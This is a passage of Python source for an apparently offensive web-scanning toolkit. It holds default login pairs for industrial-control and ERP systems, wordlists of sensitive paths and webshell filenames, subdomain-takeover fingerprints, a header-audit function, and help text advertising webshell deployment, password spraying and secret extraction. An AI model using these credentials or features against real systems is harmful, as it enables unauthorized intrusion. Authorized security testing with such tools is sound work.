    "Wonderware":      [("admin","admin")],
    "Ignition":        [("admin","password")],
    "InTouch":         [("admin","admin")],
    "FactoryTalk":     [("admin","admin")],
    "ICONICS":         [("admin","admin")],
    "Citect":          [("admin","admin")],
    "WinCC":           [("SIMATIC",""),("admin","admin")],
    "TwinCAT":         [("Administrator","1"),("admin","admin")],
    "CodeSys":         [("admin","admin")],
    "EpicOR":          [("epicor","epicor")],
    "SAP":             [("DDIC","19920706"),("SAP*","06071992"),("SAPCPIC","admin")],
    "Oracle EBS":      [("SYSADMIN","sysadmin"),("APPLSYS","apps")],
    "Dynamics":        [("admin","admin")],
    "NetSuite":        [("admin","admin")],
    "Odoo":            [("admin","admin")],
    "ERPNext":         [("administrator","admin")],
}

                                                                                 
                                                     
                                                                                 

API_SECURITY_CHECKLIST = {
    "Authentication": [
        "OWASP API1 — Broken Object Level Authorization (BOLA/IDOR)",
        "OWASP API2 — Broken Authentication",
        "OWASP API3 — Broken Object Property Level Authorization",
        "OWASP API4 — Unrestricted Resource Consumption",
        "OWASP API5 — Broken Function Level Authorization",
        "OWASP API6 — Unrestricted Access to Sensitive Business Flows",
        "OWASP API7 — Server-Side Request Forgery (SSRF)",
        "OWASP API8 — Security Misconfiguration",
        "OWASP API9 — Improper Inventory Management",
        "OWASP API10 — Unsafe Consumption of APIs",
        "JWT alg:none, weak secret, improper validation",
        "API key in URL params (leaks to logs/Referer)",
        "API key in query string vs header",
        "Missing Bearer token validation",
        "HTTP Basic Auth over HTTP (not HTTPS)",
        "Hardcoded credentials in client-side code",
        "OAuth implicit flow (deprecated, insecure)",
        "Open redirect in OAuth redirect_uri",
        "PKCE bypass in OAuth code flow",
        "Session fixation in API auth flow",
    ],
    "Authorization": [
        "IDOR — access object by ID without ownership check",
        "Privilege escalation via parameter tampering",
        "Horizontal privilege escalation between users",
        "Vertical privilege escalation to admin",
        "Mass assignment — updating protected fields",
        "Insecure Direct Object Reference in file downloads",
        "Missing function-level authorization checks",
        "Path-based authorization bypass",
        "HTTP method override to bypass restrictions (X-HTTP-Method-Override)",
        "GraphQL introspection exposes all types/queries",
        "GraphQL query depth limit not enforced",
        "GraphQL batching to bypass rate limits",
        "gRPC reflection enabled in production",
        "WebSocket authentication not enforced",
        "SSE endpoint without auth check",
    ],
    "Input Validation": [
        "SQL injection in query params, body, headers, cookies",
        "NoSQL injection (MongoDB $where, $regex)",
        "LDAP injection in search filters",
        "XML/XPath injection",
        "Command injection in OS command calls",
        "Server-Side Template Injection (SSTI)",
        "ReDoS — regex denial of service",
        "Integer overflow in pagination (limit/offset)",
        "Buffer overflow in native bindings",
        "Path traversal in file access endpoints",
        "Zip slip in file upload endpoints",
        "XXE in XML parsers",
        "SSRF via URL input parameters",
        "Open redirect via redirect parameters",
        "HTTP Response Splitting (CRLF injection)",
        "Request smuggling (CL.TE, TE.CL)",
        "Prototype pollution in JavaScript APIs",
        "Deserialization (Java, Python pickle, PHP unserialize)",
        "GraphQL injection in arguments",
        "JSON injection via improper serialization",
    ],
    "Rate Limiting": [
        "No rate limiting on auth endpoints",
        "No rate limiting on password reset",
        "No rate limiting on 2FA/OTP endpoints",
        "No rate limiting on account registration",
        "Bypassable rate limiting via IP rotation",
        "Bypassable rate limiting via X-Forwarded-For",
        "Missing account lockout policy",
        "Missing CAPTCHA on sensitive forms",
        "Algorithmic complexity attacks",
        "Unrestricted bulk data export",
        "Unrestricted file upload size",
        "Unrestricted GraphQL query complexity",
        "Unrestricted WebSocket message rate",
    ],
    "Data Exposure": [
        "Sensitive data in error messages",
        "Sensitive data in logs",
        "Sensitive data in HTTP response headers",
        "PII in URL query parameters",
        "Stack traces exposed in production",
        "Debug endpoints accessible in production",
        "Swagger/OpenAPI accessible without auth",
        "GraphQL introspection in production",
        "Source maps served in production",
        "Git repository exposed (.git/)",
        ".env files accessible",
        "Backup files accessible",
        "Verbose error messages",
        "Internal IP addresses in responses",
        "Internal paths in responses",
        "AWS/GCP/Azure credentials in responses",
    ],
    "Transport Security": [
        "HTTP instead of HTTPS",
        "Weak TLS versions (TLS 1.0, TLS 1.1)",
        "Weak cipher suites",
        "Missing HSTS header",
        "Missing certificate pinning (mobile)",
        "Self-signed certificates in production",
        "Certificate not renewed (expired)",
        "Mixed content (HTTP resources on HTTPS page)",
        "HPKP misconfiguration (deprecated)",
        "Missing DNSSEC",
        "DNS hijacking risk",
    ],
    "Security Headers": [
        "Missing X-Frame-Options → clickjacking",
        "Missing Content-Security-Policy",
        "Missing X-Content-Type-Options: nosniff → MIME sniffing",
        "Missing Referrer-Policy → leaks sensitive URLs",
        "Missing Permissions-Policy",
        "Missing Strict-Transport-Security (HSTS)",
        "Missing X-XSS-Protection (legacy)",
        "Missing Cache-Control: no-store for sensitive pages",
        "Overly permissive CORS (Access-Control-Allow-Origin: *)",
        "CORS with credentials and wildcard origin",
        "Cross-Origin-Opener-Policy missing",
        "Cross-Origin-Embedder-Policy missing",
        "Cross-Origin-Resource-Policy missing",
    ],
}

                                                                                 
                                               
                                                                                 

MODULE_HELP_TEXT = """
MAIN MENU  coded by syke — MODULE HELP

QUICK START:
  Run without arguments for interactive menu:
    python3 syke.py

  Auto-run a scan:
    python3 syke.py -t https://target.com --scan full
    python3 syke.py -t https://target.com --scan web
    python3 syke.py -t https://target.com --scan vuln
    python3 syke.py -t https://target.com --scan wp
    python3 syke.py -t https://target.com --scan recon

  Scan multiple targets:
    python3 syke.py -f targets.txt --scan full

  Skip login gate (for scripted use):
    python3 syke.py -t https://target.com --scan full --no-login

  Configure performance:
    python3 syke.py -t https://target.com --scan full --threads 20 --timeout 15

  Use a proxy:
    python3 syke.py -t https://target.com --proxy http://127.0.0.1:8080

INTERACTIVE MENU SHORTCUTS:
  [1]  Web Analysis       — fingerprint, headers, WAF, SSL, backup, JS, email, sitemap, dirs
  [2]  Vulnerability      — SQLi, LFI, SSRF, XSS, SSTI, RCE, CORS, IDOR, Upload bypass
  [3]  Auth & Brute       — auth bypass, JWT, OAuth, XMLRPC, 2FA, session fixation
  [4]  WordPress          — user enum, plugin/theme enum, CVEs, brute-force, REST API
  [5]  Recon & OSINT      — ports, DNS, subdomains, reverse IP, SSL, emails, takeover
  [6]  Advanced Attacks   — HTTP smuggling, cache poisoning, GraphQL, log4shell, XXE
  [7]  Webshell Upload    — auto detect upload, bypass restrictions, deploy shell
  [8]  Full Scan          — all phases: recon → fingerprint → vuln → auth → wordpress
  [9]  Exploit Chains     — quick/passive/aggressive/stealth preset chains
  [A]  Results & Reports  — view findings, export HTML/CSV/JSON, send to Telegram
  [B]  Telegram Bot       — manage users, start bot, send live results
  [C]  Configuration      — threads, timeout, delay, proxy, TLS, output dir
  [D]  Suggested Methods  — 60 advanced/rare techniques guide
  [E]  Extras             — CORS, clickjacking, env, git, JWT brute, dorks, spray, proxy

EXTRAS MENU [E]:
  [01] Target Info Display  — resolve IP, detect server/CMS/WAF/SSL before scan
  [02] URL Pre-Check        — test if target is alive with colored status codes
  [03] HTTP Method Probe    — find PUT/DELETE/TRACE/OPTIONS allowed on each path
  [04] CORS Full Audit      — test arbitrary origin, null origin, with credentials
  [05] Clickjacking Check   — X-Frame-Options / CSP frame-ancestors on key pages
  [06] Open Redirect Scan   — test 30+ redirect params with OPEN_REDIRECT_PAYLOADS
  [07] crt.sh Subdomain     — enumerate subdomains from certificate transparency logs
  [08] Password Spray       — smart one-per-account spray with auto rate-limit delay
  [09] Login Form Detect    — auto-discover login forms and their field names
  [10] Cookie Entropy       — measure session token randomness (bits of entropy)
  [11] JWT Weak Secret      — brute-force HS256/384/512 JWT with 200+ common secrets
  [12] Git Source Dump      — check .git/.svn/.hg exposure and fetch key files
  [13] Env File Check       — scan 40+ .env paths, extract secrets and credentials
  [14] HTML Comment Scan    — find passwords/keys left in HTML source comments
  [15] WP Plugin Version    — check plugin readme.txt to fingerprint installed versions
  [16] WP User Author Enum  — enumerate users via /?author= HTTP redirect loop
  [17] Directory Listing    — detect open directory listings on 40+ common paths
  [18] Backup File Scanner  — scan 1000+ backup file paths for exposed archives/configs
  [19] Shodan Dorks         — generate Shodan/Censys/FOFA/ZoomEye search links
  [20] Google Dorks         — generate 40+ Google dorks targeting the domain
  [21] Leak Search          — generate GitHub/Pastebin/dehashed leak search URLs
  [22] Discord Webhook      — set webhook URL, test, send findings to Discord
  [23] Proxy Manager        — load proxy list from file, test proxies, rotate
  [24] Batch Scan           — scan a list of targets from a file
  [25] Resume Scan          — continue a previously interrupted scan from checkpoint

TELEGRAM BOT:
  Set your bot token in SYKE_TG_TOKEN environment variable.
  Or enter it in Configuration → Telegram settings.

  Bot commands (in Telegram):
    /login    — authenticate with your SYKE account
    /scan     — start an interactive scan session
    /status   — show current scan status
    /results  — get latest findings
    /stop     — stop current scan
    /help     — show bot help

OUTPUT FILES:
  All findings saved to ./syke_output/ by default.
  JSON:     syke_output/findings.json
  CSV:      syke_output/findings.csv
  HTML:     syke_output/report.html
  PWNED:    syke_output/pwned.txt
  LOG:      syke_output/syke.log

NOTES:
  — Use only on targets you have explicit permission to test.
  — Aggressive scans may trigger WAFs or IDS/IPS systems.
  — Use --proxy with Burp Suite to capture all requests.
  — Verbose mode (--verbose) logs every request.
"""


def print_module_help():
    print(BLU + MODULE_HELP_TEXT + RST)
    _pause()


                                                                                 
                                       
                                                                                 

EXTENDED_SENSITIVE_PATHS = [
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/browserconfig.xml", "/manifest.json",
    "/.well-known/security.txt", "/.well-known/apple-app-site-association",
    "/.well-known/assetlinks.json",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/.well-known/jwks.json",
    "/.well-known/webfinger",
    "/.well-known/host-meta",
    "/.well-known/dnt-policy.txt",
    "/.well-known/change-password",
    "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/posts",
    "/wp-json/wp/v2/pages",
    "/wp-json/wp/v2/media",
    "/wp-json/wp/v2/categories",
    "/wp-json/wp/v2/tags",
    "/wp-json/oembed/1.0/embed",
    "/wp-json",
    "/?rest_route=/wp/v2/users",
    "/?rest_route=/wp/v2/posts",
    "/xmlrpc.php",
    "/wp-login.php",
    "/wp-admin/",
    "/wp-config.php",
    "/wp-content/debug.log",
    "/wp-content/uploads/",
    "/.git/HEAD",
    "/.git/config",
    "/.git/COMMIT_EDITMSG",
    "/.git/index",
    "/.git/logs/HEAD",
    "/.svn/entries",
    "/.svn/wc.db",
    "/.hg/manifest",
    "/.env",
    "/.env.local",
    "/.env.development",
    "/.env.production",
    "/.env.staging",
    "/.env.test",
    "/.env.backup",
    "/.env.bak",
    "/.env.old",
    "/.env.example",
    "/.env.sample",
    "/config.php",
    "/config.yml",
    "/config.yaml",
    "/config.json",
    "/config.xml",
    "/config.ini",
    "/config.env",
    "/configuration.php",
    "/settings.php",
    "/settings.py",
    "/settings.yml",
    "/local_settings.py",
    "/database.php",
    "/database.yml",
    "/db.php",
    "/db.yml",
    "/app.config",
    "/web.config",
    "/appsettings.json",
    "/appsettings.Development.json",
    "/appsettings.Production.json",
    "/application.properties",
    "/application.yml",
    "/application.yaml",
    "/bootstrap.php",
    "/index.php.bak",
    "/index.html.bak",
    "/index.php~",
    "/index.html~",
    "/login.php.bak",
    "/login.php~",
    "/admin.php.bak",
    "/config.php.bak",
    "/config.php~",
    "/config.php.orig",
    "/config.php.save",
    "/config.php.swp",
    "/.config.php.swp",
    "/.index.php.swp",
    "/.wp-config.php.swp",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/debug.php",
    "/dump.php",
    "/shell.php",
    "/cmd.php",
    "/eval.php",
    "/backdoor.php",
    "/webshell.php",
    "/b374k.php",
    "/r57.php",
    "/c99.php",
    "/wso.php",
    "/upload.php",
    "/uploader.php",
    "/up.php",
    "/file.php",
    "/files.php",
    "/proxy.php",
    "/tunnel.php",
    "/socks.php",
    "/sock.php",
    "/ajax.php",
    "/cron.php",
    "/job.php",
    "/task.php",
    "/api.php",
    "/feed.php",
    "/rss.php",
    "/atom.php",
    "/sitemap.php",
    "/install.php",
    "/setup.php",
    "/init.php",
    "/migrate.php",
    "/update.php",
    "/upgrade.php",
    "/deploy.php",
    "/maintenance.php",
    "/status.php",
    "/health.php",
    "/ping.php",
    "/log.php",
    "/logs.php",
    "/error.php",
    "/exception.php",
    "/trace.php",
    "/server_info.php",
    "/server-info.php",
    "/server-status.php",
    "/server_status.php",
    "/?_phpinfo=1",
    "/?phpinfo=1",
    "/?info=1",
    "/?debug=1",
    "/?test=1",
    "/?trace=1",
    "/?dump=1",
    "/?env=1",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/beans",
    "/actuator/mappings",
    "/actuator/metrics",
    "/actuator/info",
    "/actuator/httptrace",
    "/actuator/logfile",
    "/actuator/dump",
    "/actuator/heapdump",
    "/actuator/threaddump",
    "/actuator/shutdown",
    "/actuator/refresh",
    "/actuator/configprops",
    "/actuator/scheduledtasks",
    "/actuator/sessions",
    "/actuator/caches",
    "/actuator/conditions",
    "/swagger",
    "/swagger-ui",
    "/swagger-ui/",
    "/swagger-ui.html",
    "/swagger-ui/index.html",
    "/swagger.json",
    "/swagger.yaml",
    "/swagger.yml",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api-docs",
    "/api-docs/",
    "/openapi",
    "/openapi.json",
    "/openapi.yaml",
    "/openapi.yml",
    "/redoc",
    "/redoc/",
    "/rapidoc",
    "/graphql",
    "/graphiql",
    "/graphql/console",
    "/graphql/schema",
    "/graphql/playground",
    "/altair",
    "/voyager",
    "/playground",
    "/console",
    "/api/explorer",
    "/api/playground",
    "/api/swagger",
    "/api/docs",
]

                                                                                 
                                                      
                                                                                 

WP_PLUGINS_EXTENDED = [
    "contact-form-7","wordfence","yoast-seo","akismet","woocommerce",
    "jetpack","wp-super-cache","elementor","classic-editor","wp-forms",
    "really-simple-ssl","updraftplus","duplicator","all-in-one-wp-migration",
    "wpforms-lite","all-in-one-seo-pack","google-analytics-for-wordpress",
    "limit-login-attempts-reloaded","google-sitemap-generator","redirection",
    "ewww-image-optimizer","advanced-custom-fields","beaver-builder-lite-version",
    "popup-maker","woocommerce-pdf-invoices-packing-slips","wp-mail-smtp",
    "mailchimp-for-wp","ninja-forms","gravity-forms","formidable",
    "wp-optimize","hummingbird-performance","smush","wp-rocket",
    "wp-fastest-cache","litespeed-cache","comet-cache","w3-total-cache",
    "autoptimize","asset-cleanup","wp-sweep","better-wp-security",
    "all-in-one-wp-security-and-firewall","ithemes-security","sucuri-scanner",
    "defender-security","malcare-security","solid-security","wp-cerber",
    "login-lockdown","loginizer","two-factor","wp-2fa",
    "google-authenticator","miniOrange-2-factor-authentication",
    "buddypress","bbpress","peepso","ultimate-member","user-registration",
    "profile-builder","wp-user-avatar","simple-membership","paid-memberships-pro",
    "memberpress","restrict-content-pro","s2member","wishlist-member",
    "learndash","lifterlms","learnpress","masteriyo","tutor-lms","sensei-lms",
    "woocommerce-memberships","woocommerce-subscriptions","woocommerce-bookings",
    "woocommerce-appointments","woocommerce-gift-cards",
    "woocommerce-stripe-gateway","woocommerce-paypal-payments",
    "woocommerce-gateway-paypal-express-checkout",
    "woocommerce-square","woocommerce-authorize-net",
    "woocommerce-amazon-s3-storage","woocommerce-shipstation-integration",
    "woocommerce-fedex-shipping-module","woocommerce-ups-shipping-module",
    "woocommerce-usps-shipping-module","woocommerce-dhl-express-shipping",
    "royal-elementor-addons","essential-addons-for-elementor",
    "elementor-pro","elementor-addon-elements","prime-slider-addons-for-elementor",
    "happy-elementor-addons","premium-addons-for-elementor",
    "jetpack-boost","jetpack-backup","jetpack-protect","jetpack-social",
    "divi-builder","visual-composer","wpbakery-page-builder","fusion-builder",
    "themify-builder","beaver-builder","siteorigin-panels",
    "generate-press","hello-elementor","astra","oceanwp","flatsome",
    "the7","avada","salient","x-the-theme","bridge","kalium",
    "translatepress-multilingual","weglot","polylang","wpml",
    "qTranslate-XT","loco-translate","TranslatePress",
    "woocommerce-multilingual","WPML-String-Translation",
    "advanced-custom-fields-pro","acf-extended","acf-theme-code-pro",
    "metabox","pods","toolset-blocks","types","cptui","pods-gravity-forms",
    "page-builder-framework","page-layer","page-builder-pro",
    "simple-page-ordering","cms-tree-page-view","page-list",
    "wp-custom-post-type-ui","custom-post-type-maker","custom-post-type-permalink",
    "taxonomy-terms-order","category-order-and-taxonomy-terms-order",
    "post-order-with-drag-and-drop","quick-reorder",
    "wp-menu-editor","nav-menu-roles","menu-icons","wp-nav-menus",
    "coming-soon","under-construction-page","maintenance","wp-maintenance-mode",
    "simple-custom-css","custom-css-js","wp-add-custom-css",
    "head-footer-code","head-footer-scripts","wp-code-manager",
    "insert-headers-and-footers","header-footer-code-manager",
    "scripts-to-footer","wp-dequeue-scripts","asset-manager",
    "regenerate-thumbnails","safe-svg","enable-svg-support",
    "svg-support","wp-svg-images","svg-vector-icons-plugin",
    "admin-menu-editor","adminimize","admin-customizer","wp-backend-helper",
    "admin-bar-disabler","remove-dashboard-access","admin-menu-organizer",
    "front-end-pm","private-messages-for-wordpress","wp-private-messages",
    "liveagent","tawkto-live-chat","crisp","pure-chat","formilla",
    "wp-statistics","jetpack-stats","statpress","site-kit-by-google",
    "google-tag-manager-for-wordpress","google-analytics-async",
    "pixelmate","facebook-pixel","twitter-pixel","linkedin-insight",
    "wp-google-recaptcha","cf7-recaptcha","recaptcha-contact-form7",
    "hcaptcha-for-forms-and-more","really-simple-captcha",
    "tinymce-advanced","classic-tinymce","gutenberg","block-editor",
    "advanced-editor-tools","coblocks","stackable-ultimate-gutenberg-blocks",
    "kadence-blocks","getwid-gutenberg-blocks","spectra","otter-blocks",
    "ultimate-blocks","editorial-calendar","publish-future-date",
    "post-duplicator","duplicate-post","yoast-duplicate-post",
    "post-smtp","wp-smtp","postman-smtp","easy-wp-smtp","gmail-smtp",
    "newsletter","newsletter-mailchimp-form","mailpoet","sendgrid",
    "mandrill-wp","amazon-ses-wp-mail","sparkpost","mailgun-wordpress-plugin",
    "tablepress","wp-data-tables","supsystic-table","datatables",
    "ninja-tables","tablesome","powerful-shortcodes","shortcode-ultimate",
    "aryo-activity-log","wp-activity-log","activity-log","user-activity-log",
    "woocommerce-extra-checkout-fields-for-brazil",
    "checkout-field-editor","woo-checkout-field-editor-pro",
    "flexible-checkout-fields","woocommerce-germanized",
    "german-market","woocommerce-product-options","woo-product-addons",
    "product-addons-for-woocommerce","fancy-product-designer",
    "woocommerce-product-table","woo-product-table",
    "wp-lister-for-ebay","wp-lister-for-amazon","wpla",
    "google-listings-and-ads","facebook-for-woocommerce",
    "woocommerce-square","taxjar-simplified-taxes-for-woocommerce",
    "avalara-avatax","woocommerce-eu-vat-assistant",
    "woo-vat-validator","eu-vat-for-woocommerce",
    "woocommerce-zapier","metorik","metorik-helper","wc-export",
    "woocommerce-exporter","wp-all-export","wp-all-import",
    "datafeedr-woocommerce-importer","woo-import-export-lite",
    "tablepress-hmi","gf-signature","gravity-forms-signature",
    "gf-stripe","gf-paypal","gf-paypal-pro","gf-square",
    "cf7-stripe","cf7-paypal","cf7-hubspot",
    "caldera-forms","wpforms","wpforms-lite","wpcf7",
    "mc4wp","mailchimp-for-woocommerce","hubspot","hubwoo",
    "salesforce-wordpress-to-lead","zoho-flow","activecampaign",
    "drip","convertkit","groundhogg","autopilot","mautic",
    "omnisend","klaviyo","sendpulse","mailpoet-newsletters",
    "optinmonster","popup-builder","popups","layered-popups",
    "ninja-popups","hustle","icegram","convertpro","thrive-leads",
    "thrive-quiz-builder","thrive-comments","thrive-ovation",
    "thrive-automator","thrive-apprentice","thrive-theme-builder",
]

                                                                                 
                                                
                                                                                 

TAKEOVER_FINGERPRINTS_EXTENDED = {
    "GitHub Pages":        "There isn't a GitHub Pages site here.",
    "Heroku":              "No such app",
    "Fastly":              "Fastly error: unknown domain",
    "Ghost":               "The thing you were looking for is no longer here",
    "Pantheon":            "The gods are in session",
    "Tumblr":              "There's nothing here.",
    "WordPress.com":       "Do you want to register",
    "Shopify":             "Sorry, this shop is currently unavailable.",
    "Squarespace":         "No Such Account",
    "Cargo":               "If you're moving your domain away from Cargo you must",
    "Campaign Monitor":    "Double check the URL or (go back|take me home)",
    "Mailchimp":           "Looks like you've traveled too far into cyberspace",
    "Zendesk":             "Help Center Closed",
    "Readme.io":           "Project doesnt exist... yet!",
    "HubSpot":             "Domain not found",
    "Strikingly":          "But if you're looking to build your own website",
    "Surge.sh":            "project not found",
    "Bitbucket":           "Repository not found",
    "Azure":               "404 Web Site not found",
    "AWS S3":              "NoSuchBucket",
    "AWS Elastic Beanstalk":"ERROR: The request could not be satisfied",
    "Cloudfront":          "ERROR: The request could not be satisfied",
    "Tilda":               "Please renew your subscription",
    "Teamwork":            "Oops - We didn't find your site.",
    "Intercom":            "This page is reserved for artistic imagination.",
    "WP Engine":           "The site you were looking for couldn't be found",
    "Instapage":           "Looks Like You're Lost",
    "Desk.com":            "Sorry, We Couldn't Find That Page",
    "Mashery":             "Mashery Hosted Endpoint",
    "Freshdesk":           "We couldn't find this page",
    "Pingdom":             "This public status page does not seem to exist",
    "Tictail":             "Building a brand of your very own?",
    "UptimeRobot":         "page not found",
    "Proposify":           "If you need immediate assistance, please contact",
    "SimpleBooklet":       "We can't find this page.",
    "Vend":                "Looks like you've traveled too far into cyberspace",
    "Webflow":             "The page you are looking for doesn't exist or has been moved",
    "Kajabi":              "The page you are looking for, could not be found",
    "Feedpress":           "The feed has not been found.",
    "Short.io":            "This link does not exist",
    "Kinsta":              "No site here",
    "Aftership":           "Oops.",
    "Smartling":           "Domain is not configured",
    "ActiveCampaign":      "No settings were found for this company",
    "Agile CRM":           "Sorry, this page is no longer available!",
    "StatusPage.io":       "You are being redirected",
    "Fly.io":              "404 Not Found",
    "Render":              "Nothing here",
    "Railway":             "Application Error",
    "Netlify":             "Not Found",
    "Vercel":              "The deployment could not be found",
    "Surge":               "project not found",
    "Coolify":             "404 Not Found",
    "PlanetScale":         "This database is not found",
    "Supabase":            "project not found",
    "Appwrite":            "Project not found",
    "Firebase":            "Site Not Found",
    "Google Cloud":        "Sorry, the file you have requested does not exist",
}

                                                                                 
                                              
                                                                                 

SECURITY_HEADERS_FULL = {
    "Strict-Transport-Security": {
        "required": True,
        "recommended": "max-age=31536000; includeSubDomains; preload",
        "desc": "HSTS: force HTTPS, prevent downgrade attacks",
        "severity": "HIGH",
    },
    "Content-Security-Policy": {
        "required": True,
        "recommended": "default-src 'self'; script-src 'self'; object-src 'none'",
        "desc": "CSP: restrict resource loading, prevent XSS",
        "severity": "HIGH",
    },
    "X-Frame-Options": {
        "required": True,
        "recommended": "DENY",
        "desc": "Prevent clickjacking via iframe embedding",
        "severity": "MEDIUM",
    },
    "X-Content-Type-Options": {
        "required": True,
        "recommended": "nosniff",
        "desc": "Prevent MIME sniffing attacks",
        "severity": "MEDIUM",
    },
    "Referrer-Policy": {
        "required": True,
        "recommended": "strict-origin-when-cross-origin",
        "desc": "Control Referer header leakage",
        "severity": "LOW",
    },
    "Permissions-Policy": {
        "required": True,
        "recommended": "geolocation=(), microphone=(), camera=()",
        "desc": "Restrict browser feature access",
        "severity": "LOW",
    },
    "X-XSS-Protection": {
        "required": False,
        "recommended": "0",
        "desc": "Legacy XSS filter (disabled by modern CSP)",
        "severity": "INFO",
    },
    "Cache-Control": {
        "required": True,
        "recommended": "no-store",
        "desc": "Prevent caching of sensitive pages",
        "severity": "MEDIUM",
    },
    "Access-Control-Allow-Origin": {
        "required": False,
        "recommended": "specific-origin",
        "desc": "CORS — should not be wildcard for sensitive APIs",
        "severity": "HIGH",
    },
    "Cross-Origin-Opener-Policy": {
        "required": True,
        "recommended": "same-origin",
        "desc": "Isolate browsing context, prevent Spectre attacks",
        "severity": "MEDIUM",
    },
    "Cross-Origin-Embedder-Policy": {
        "required": False,
        "recommended": "require-corp",
        "desc": "Require CORP on subresources",
        "severity": "MEDIUM",
    },
    "Cross-Origin-Resource-Policy": {
        "required": False,
        "recommended": "same-origin",
        "desc": "Prevent cross-origin reads of responses",
        "severity": "MEDIUM",
    },
    "Feature-Policy": {
        "required": False,
        "recommended": "Replaced by Permissions-Policy",
        "desc": "Legacy: restrict browser features",
        "severity": "INFO",
    },
    "Expect-CT": {
        "required": False,
        "recommended": "Deprecated in favor of HSTS preloading",
        "desc": "Certificate Transparency enforcement",
        "severity": "INFO",
    },
    "Public-Key-Pins": {
        "required": False,
        "recommended": "DEPRECATED — do not use",
        "desc": "HPKP: deprecated, can brick sites",
        "severity": "INFO",
    },
    "Server": {
        "required": False,
        "recommended": "Remove or obfuscate",
        "desc": "Information disclosure of server software",
        "severity": "LOW",
    },
    "X-Powered-By": {
        "required": False,
        "recommended": "Remove completely",
        "desc": "Information disclosure of backend technology",
        "severity": "LOW",
    },
    "X-AspNet-Version": {
        "required": False,
        "recommended": "Remove completely",
        "desc": "Information disclosure of ASP.NET version",
        "severity": "LOW",
    },
    "X-AspNetMvc-Version": {
        "required": False,
        "recommended": "Remove completely",
        "desc": "Information disclosure of ASP.NET MVC version",
        "severity": "LOW",
    },
}


def security_headers_full_audit(target):
    _banner()
    ok_, url, r = check_host(target)
    if not ok_:
        _pause()
        return {}
    base = normalize_base(url)
    _info(f"Security Headers Full Audit → {base}")
    results = {}

    try:
        r2 = _get(base + "/", timeout=TIMEOUT)
        if not r2:
            _pause()
            return {}
        hdrs = r2.headers
        print()
        for header, info in SECURITY_HEADERS_FULL.items():
            val = hdrs.get(header, None)
            if val:
                if header == "Access-Control-Allow-Origin" and val == "*":
                    _vuln(f"[WEAK]  {header}: {val}")
                    results[header] = {"value": val, "status": "weak"}
                    _add_finding(
                        "HIGH","CORS Wildcard Header",base,
                        "Access-Control-Allow-Origin: * allows any origin",
                        f"{header}: {val}",
                        "Set ACAO to specific trusted origin(s).",
                        "Headers"
                    )
                elif header in ("Server","X-Powered-By","X-AspNet-Version","X-AspNetMvc-Version"):
                    _warn(f"[INFO]  {header}: {val} — consider removing")
                    results[header] = {"value": val, "status": "present_info"}
                else:
                    _found(f"[OK]    {header}: {val[:60]}")
                    results[header] = {"value": val, "status": "ok"}
            else:
                if info["required"]:
                    col = RED if info["severity"] == "HIGH" else YLW
                    _vuln(f"[MISSING] {header}  {DIM}{info['desc']}{RST}")
                    results[header] = {"value": None, "status": "missing"}
                    _add_finding(
                        info["severity"],
                        f"Missing Header: {header}",
                        base,
                        info["desc"],
                        f"Recommended: {info['recommended']}",
                        f"Add header: {header}: {info['recommended']}",
                        "Security Headers"
                    )
                else:
                    _log("verbose", f"[SKIP]  {header} — not required")
                    results[header] = {"value": None, "status": "not_required"}
    except Exception as e:
        _err(f"Headers audit error: {e}")

    missing = [k for k, v in results.items()
               if v["status"] == "missing"]
    weak    = [k for k, v in results.items()
               if v["status"] == "weak"]

    if missing or weak:
        detail = (f"Missing: {', '.join(missing[:5])}\n"
                  f"Weak:    {', '.join(weak[:5])}")
        _found_box("SECURITY HEADERS", base, detail, found=True)
    else:
        _clean("Security headers look good")
        _found_box("SECURITY HEADERS", base, "All required headers present", found=False)

    _result_box("HEADERS AUDIT",[
        f"{RED}[MISSING]{RST} {h}"
        for h in missing[:10]
    ] + [
        f"{YLW}[WEAK]{RST} {h}"
        for h in weak[:5]
    ] or [f"{GRN}All headers OK{RST}"])
    _pause()
    return results



                                                                                 
                                                        
                                                                                 

EXTENDED_SUBDOMAIN_WORDS_2 = [
    "www","mail","ftp","admin","portal","app","api","dev","staging",
    "test","uat","qa","sandbox","beta","demo","preview","build",
    "git","gitlab","jenkins","ci","cd","repo","svn","bitbucket",
    "jira","confluence","wiki","docs","documentation","help",
    "support","helpdesk","ticket","service","servicedesk",
    "vpn","remote","rdp","ssh","citrix","webmail","exchange",
    "smtp","pop","imap","mx","mail2","mail3","mailserver",
    "webmail","owa","autodiscover","autoconfig",
    "ns1","ns2","ns3","ns4","dns","dns1","dns2","nameserver",
    "cdn","static","assets","images","img","media","files",
    "upload","uploads","download","downloads","storage","blob",
    "s3","gcs","azure-blob","cloudfront","fastly","akamai",
    "db","database","mysql","postgres","mongo","redis","elastic",
    "db1","db2","db3","rds","aurora","dbmaster","dbreplica",
    "mysql1","mysql2","pgsql","postgresql","mongodb","couchdb",
    "cache","cache1","cache2","redis1","redis2","memcache",
    "broker","kafka","rabbitmq","activemq","nats","zeromq",
    "queue","worker","worker1","worker2","worker3","jobs",
    "scheduler","cron","task","tasks","background","async",
    "api","api2","api3","api-v1","api-v2","api-v3","rest","rpc",
    "graphql","grpc","soap","xml","json","webhook","webhooks",
    "internal","internal-api","private","priv","hidden","secret",
    "corp","corporate","intranet","extranet","partner","partners",
    "b2b","b2c","wholesale","retail","enterprise","business",
    "erp","crm","hr","hrm","hcm","payroll","accounting","finance",
    "billing","invoice","payment","payments","checkout","orders",
    "ecommerce","shop","store","catalog","cart","wish","wishlist",
    "login","auth","oauth","sso","saml","idp","identity","iam",
    "signin","signup","register","registration","account","accounts",
    "admin","administrator","superadmin","root","sysadmin","webmaster",
    "cpanel","whm","plesk","panel","control","controlpanel",
    "phpmyadmin","adminer","pma","dbadmin","sqladmin","pgadmin",
    "monitoring","monitor","grafana","prometheus","kibana","elastic",
    "logging","logs","syslog","logstash","graylog","splunk","datadog",
    "metrics","stats","statistics","analytics","tracking","tag",
    "gtm","ga","segment","mixpanel","amplitude","heap","pendo",
    "status","health","healthcheck","uptime","pingdom","statuspage",
    "oncall","alertmanager","pagerduty","opsgenie","victorops",
    "backup","backups","bak","restore","archive","archives","dr",
    "failover","ha","cluster","primary","secondary","replica","slave",
    "master","node1","node2","node3","server1","server2","server3",
    "web","web1","web2","web3","app","app1","app2","app3",
